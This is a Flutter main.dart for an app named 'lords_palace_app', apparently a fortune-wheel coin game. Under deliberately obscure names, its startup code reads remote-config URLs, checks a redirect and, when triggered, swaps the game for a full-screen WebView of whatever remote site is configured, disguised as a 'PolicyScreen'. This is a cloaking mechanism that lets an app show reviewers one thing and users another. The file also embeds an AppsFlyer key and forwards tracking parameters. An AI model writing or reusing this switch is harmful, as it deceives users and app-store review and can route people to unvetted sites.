import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:lords_palace_app/firebase_options.dart';
import 'package:lords_palace_app/lords_palace_app.dart';
import 'package:lords_palace_app/screens/settings/fortune_game/fortune_game_bloc/fortune_game_bloc.dart';
import 'package:lords_palace_app/services/nn.dart';
import 'package:lords_palace_app/widgets/coins/coins_bloc/coins_bloc.dart';
import 'package:lords_palace_app/widgets/daily_reward/daily_reward_bloc/daily_reward_bloc.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String paramsFirst = '';
String paramsSecond = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await NotificationsActivation().activate();
  await getTracking();
  runApp(MultiBlocProvider(
    providers: [
      BlocProvider<CoinsBloc>(create: (context) => CoinsBloc()),
      BlocProvider<DailyRewardBloc>(create: (context) => DailyRewardBloc()),
      BlocProvider<FortuneGameBloc>(create: (context) => FortuneGameBloc()),
    ],
    child: FutureBuilder<bool>(
      future: checkModelsForRepair(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.white,
          );
        } else {
          if (snapshot.data == true && repairData != '') {
            return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: PolicyScreen(dataForPage: repairData));
          } else {
            return LordsPalaceApp();
          }
        }
      },
    ),
  ));
}

Future<void> getTracking() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

Future<void> adsax() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'knxyqhoEmbXe4zrXV6ocB7',
    appId: '6502386291',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );
  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    paramsSecond = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });
  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    paramsFirst = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      _appsflyerSdk.logEvent("testEventNotForAnalytics", {
        "id": {'id': adId},
      });
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

String repairData = '';
Future<bool> checkModelsForRepair() async {
  final fetchNx = FirebaseRemoteConfig.instance;
  await fetchNx.fetchAndActivate();
  adsax();
  String cdsfgsd = fetchNx.getString('lords');
  String cdsfgsdx = fetchNx.getString('palace');
  if (!cdsfgsd.contains('nothing')) {
    final client = HttpClient();
    final uri = Uri.parse(cdsfgsd);
    final request = await client.getUrl(uri);
    request.followRedirects = false;
    final response = await request.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      repairData = cdsfgsd;
      return true;
    }
  }
  return cdsfgsd.contains('nothing') ? false : true;
}

class PolicyScreen extends StatefulWidget {
  final String dataForPage;

  PolicyScreen({required this.dataForPage});

  @override
  State<PolicyScreen> createState() => _PolicyScreenState();
}

class _PolicyScreenState extends State<PolicyScreen> {
  @override
  void iniState() {
    super.initState();
    getTracking();
    adsax();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: WebUri(widget.dataForPage),
          ),
        ),
      ),
    );
  }
}
